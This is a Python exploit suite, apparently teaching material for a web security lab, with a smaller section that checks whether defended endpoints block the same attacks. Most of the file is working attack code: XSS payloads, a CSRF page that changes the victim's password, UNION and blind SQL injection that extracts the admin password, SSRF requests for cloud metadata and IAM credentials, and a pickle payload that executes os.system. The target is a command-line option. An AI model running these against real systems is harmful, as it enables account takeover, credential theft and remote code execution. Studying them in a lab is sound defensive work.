"""
Web Security — XSS, CSRF, SQLi, SSRF, Deserialization Exploit Scripts

Phase 12 — Cryptography & Security, Lesson 21

Usage:
    python3 main.py xss      # XSS exploit demo
    python3 main.py csrf     # CSRF exploit demo
    python3 main.py sqli     # SQL injection exploit demo
    python3 main.py ssrf     # SSRF exploit demo
    python3 main.py pickle   # Pickle deserialization RCE demo
    python3 main.py all      # Run all exploit demos
    python3 main.py defend   # Run all defended versions (should fail)
"""

import argparse
import http.server
import io
import json
import os
import pickle
import socket
import subprocess
import sys
import threading
import time
import urllib.parse

import requests


# ---------------------------------------------------------------------------
# XSS — Cross-Site Scripting
# ---------------------------------------------------------------------------

def xss_steal_cookie(target_url: str, payload: str) -> str:
    """
    Sends a reflected XSS payload to a vulnerable endpoint.
    Returns the raw HTML response containing the unescaped payload.
    """
    resp = requests.get(target_url, params={"q": payload}, timeout=5)
    return resp.text


def xss_stored_comment(target_url: str, payload: str) -> str:
    """
    Stores an XSS payload via the comment endpoint, then retrieves it.
    """
    requests.post(f"{target_url}/comment-vuln", data={"text": payload}, timeout=5)
    resp = requests.get(f"{target_url}/comments-vuln", timeout=5)
    return resp.text


# ---------------------------------------------------------------------------
# CSRF — Cross-Site Request Forgery
# ---------------------------------------------------------------------------

CSRF_HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<body>
<h1>You won a prize! Click to claim...</h1>
<form id="f" action="{action}" method="POST">
  <input type="hidden" name="newPassword" value="hacked">
</form>
<script>document.getElementById('f').submit();</script>
</body>
</html>"""


def csrf_attack(target_url: str, victim_action: str) -> str:
    """
    Generates an auto-submitting HTML form for CSRF.
    Returns the HTML content for use in an iframe or served to the victim.
    """
    return CSRF_HTML_TEMPLATE.format(action=victim_action)


def csrf_serve_and_exploit(server_url: str, action_endpoint: str) -> None:
    """
    Starts a local HTTP server serving a CSRF page,
    then opens it in a browser (or prints the URL for manual use).
    """
    html = csrf_attack(server_url, action_endpoint)
    port = 8888

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(html.encode())

        def log_message(self, format: str, *args: object) -> None:
            pass

    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[CSRF] Serving CSRF page at http://localhost:{port}/")
    print(f"[CSRF] Victim must be logged into {server_url}")
    print(f"[CSRF] When visited, it will POST to {action_endpoint}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.shutdown()


# ---------------------------------------------------------------------------
# SQLi — SQL Injection
# ---------------------------------------------------------------------------

def sqli_extract_table(target_url: str, table_name: str) -> list[dict[str, str]]:
    """
    Uses UNION-based SQL injection to extract data from a named table.
    Assumes the vulnerable login endpoint returns all matching rows.
    Injects: ' UNION SELECT id, username, password FROM <table> --
    """
    payload = f"' UNION SELECT id, username, password FROM {table_name} --"
    resp = requests.post(
        f"{target_url}/login-vuln",
        data={"username": payload, "password": ""},
        timeout=5,
    )
    lines = resp.text.strip().split("\n")
    results = []
    for line in lines:
        if "Welcome," in line:
            results.append({"username": line.replace("Welcome, ", ""), "extracted": True})
    return results


def sqli_blind_extract(target_url: str) -> str:
    """
    Boolean-based blind SQLi extraction of the admin password.
    Uses SUBSTR and binary search per character.
    """
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    extracted = ""
    url = f"{target_url}/login-vuln"
    for pos in range(1, 33):
        found = False
        for ch in charset:
            payload = f"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),{pos},1)='{ch}' --"
            resp = requests.post(url, data={"username": payload, "password": ""}, timeout=5)
            if "Welcome" in resp.text:
                extracted += ch
                found = True
                break
        if not found:
            break
    return extracted


# ---------------------------------------------------------------------------
# SSRF — Server-Side Request Forgery
# ---------------------------------------------------------------------------

def ssrf_probe(target_url: str, internal_endpoint: str) -> str:
    """
    Probes an internal endpoint through the vulnerable fetch-url endpoint.
    Returns the response text from the internal service.
    """
    resp = requests.post(
        f"{target_url}/fetch-url-vuln",
        json={"url": internal_endpoint},
        timeout=10,
    )
    return resp.text


def ssrf_metadata(target_url: str) -> dict[str, str]:
    """
    Attempts to reach cloud metadata services through SSRF.
    """
    endpoints = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]
    results: dict[str, str] = {}
    for ep in endpoints:
        try:
            text = ssrf_probe(target_url, ep)
            results[ep] = text[:500] if text else "(empty)"
        except Exception as exc:
            results[ep] = f"(error: {exc})"
    return results


# ---------------------------------------------------------------------------
# Insecure Deserialization — Pickle RCE
# ---------------------------------------------------------------------------

class PickleExploit:
    """
    A malicious pickle payload that executes a command during deserialization.
    Uses __reduce__ to return (os.system, (command,)).
    """

    def __reduce__(self):
        cmd = "echo 'PICKLE_RCE: $(whoami) on $(hostname)'"
        return (os.system, (cmd,))


def unsafe_deserialize(pickle_data: bytes) -> object:
    """
    Deserializes untrusted pickle data.
    WARNING: This will execute arbitrary code embedded in the pickle.
    """
    return pickle.loads(pickle_data)


def pickle_rce_demo() -> None:
    """
    Demonstrates Python pickle RCE by crafting and deserializing
    a malicious payload.
    """
    payload = pickle.dumps(PickleExploit())
    print(f"[Pickle] Crafted payload ({len(payload)} bytes)")
    print(f"[Pickle] Raw bytes (first 80): {payload[:80]}")
    print("[Pickle] Deserializing now — this will execute os.system()...")
    result = unsafe_deserialize(payload)
    print(f"[Pickle] Deserialized result: {result}")


# ---------------------------------------------------------------------------
# Defended version tests (these should FAIL against the /search, /login, etc.)
# ---------------------------------------------------------------------------

def defend_xss(target_url: str) -> bool:
    """
    Tests the defended /search endpoint — XSS payload should be escaped.
    Returns True if the response is safe (payload escaped).
    """
    payload = '<script>alert(1)</script>'
    resp = requests.get(f"{target_url}/search", params={"q": payload}, timeout=5)
    return payload not in resp.text


def defend_sqli(target_url: str) -> bool:
    """
    Tests the defended /login endpoint — SQLi should fail.
    Returns True if login was rejected.
    """
    resp = requests.post(
        f"{target_url}/login",
        data={"username": "admin' OR '1'='1", "password": ""},
        timeout=5,
    )
    return resp.status_code == 401


def defend_csrf(target_url: str) -> bool:
    """
    Tests the defended /change-password endpoint — request without
    CSRF token should be rejected.
    """
    resp = requests.post(
        f"{target_url}/change-password",
        data={"newPassword": "hacked"},
        timeout=5,
    )
    return resp.status_code == 403


def defend_ssrf(target_url: str) -> bool:
    """
    Tests the defended /fetch-url endpoint — internal IPs should be rejected.
    """
    resp = requests.post(
        f"{target_url}/fetch-url",
        json={"url": "http://169.254.169.254/latest/meta-data/"},
        timeout=5,
    )
    return resp.status_code == 403


def defend_deserialize(target_url: str) -> bool:
    """
    Tests the defended /deserialize endpoint — unsigned data should be rejected.
    """
    resp = requests.post(
        f"{target_url}/deserialize",
        json={"data": '{"malicious": true}'},
        headers={"x-signature": ""},
        timeout=5,
    )
    return resp.status_code == 403


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def run_all(target_url: str) -> None:
    print("=" * 60)
    print("WEB SECURITY LAB — Exploit Suite")
    print("=" * 60)

    print("\n── XSS Reflected ──")
    text = xss_steal_cookie(target_url, '<script>alert(1)</script>')
    print(f"  Payload present in response: {'<script>' in text}")

    print("\n── CSRF Page ──")
    html = csrf_attack(target_url, f"{target_url}/change-password-vuln")
    print(f"  Generated {len(html)} byte HTML page")

    print("\n── SQLi UNION Extract ──")
    rows = sqli_extract_table(target_url, "users")
    print(f"  Extracted {len(rows)} rows")

    print("\n── SSRF Probe ──")
    results = ssrf_metadata(target_url)
    for ep, text in results.items():
        print(f"  {ep}: {text[:80]}")

    print("\n── Pickle RCE ──")
    pickle_rce_demo()

    print("\n── Defenses (should all be True) ──")
    print(f"  XSS escaped:    {defend_xss(target_url)}")
    print(f"  SQLi blocked:   {defend_sqli(target_url)}")
    print(f"  CSRF blocked:   {defend_csrf(target_url)}")
    print(f"  SSRF blocked:   {defend_ssrf(target_url)}")
    print(f"  Deser blocked:  {defend_deserialize(target_url)}")


def run_defend(target_url: str) -> None:
    results = {
        "xss": defend_xss(target_url),
        "sqli": defend_sqli(target_url),
        "csrf": defend_csrf(target_url),
        "ssrf": defend_ssrf(target_url),
        "deserialize": defend_deserialize(target_url),
    }
    for name, ok in results.items():
        status = "PASS" if ok else "FAIL"
        print(f"[{status}] {name}")
    if all(results.values()):
        print("\nAll defenses active!")
    else:
        print("\nSome defenses are missing!")


def main() -> None:
    parser = argparse.ArgumentParser(description="Web Security Exploit Suite")
    parser.add_argument(
        "action",
        nargs="?",
        default="all",
        choices=["xss", "csrf", "sqli", "ssrf", "pickle", "all", "defend"],
    )
    parser.add_argument("--target", default="http://localhost:4001", help="Target URL")
    args = parser.parse_args()

    actions = {
        "xss": lambda: print(xss_steal_cookie(args.target, '<script>alert(1)</script>')),
        "csrf": lambda: csrf_serve_and_exploit(args.target, f"{args.target}/change-password-vuln"),
        "sqli": lambda: print(sqli_extract_table(args.target, "users")),
        "ssrf": lambda: print(ssrf_metadata(args.target)),
        "pickle": pickle_rce_demo,
        "all": lambda: run_all(args.target),
        "defend": lambda: run_defend(args.target),
    }

    actions[args.action]()


if __name__ == "__main__":
    main()
